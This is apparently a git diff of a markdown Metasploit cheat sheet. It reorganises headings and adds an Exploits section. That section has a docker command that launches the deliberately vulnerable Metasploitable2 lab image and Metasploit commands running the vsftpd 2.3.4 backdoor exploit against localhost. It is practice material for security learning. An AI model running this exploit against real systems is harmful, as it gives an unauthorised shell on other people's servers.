@@ -15,7 +15,7 @@ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/t
 
 ## Usage
 
-## Information Gathering -- Scanner
+### Information Gathering -- Scanner
 
 ```bash
 search path:auxiliary/scanner ssl
@@ -47,11 +47,26 @@ run
 ```
 * bigger wordlists at https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
 
-## Alternatives
+### Alternatives
 
 * nmap
-* gobuster
+* gobuster/ffuf
 * sqlmap
 
-### dirsearch
+## SQL Injection
 
+## Access Control
+
+## Exploits
+
+```bash
+docker run -d --net=host --name metasploitable2 tleemcjr/metasploitable2 /bin/bash -c "/bin/services.sh && tail -f /dev/null"
+```
+
+```bash
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 127.0.0.1
+set RPORT 21
+set LHOST localhost
+run
+```
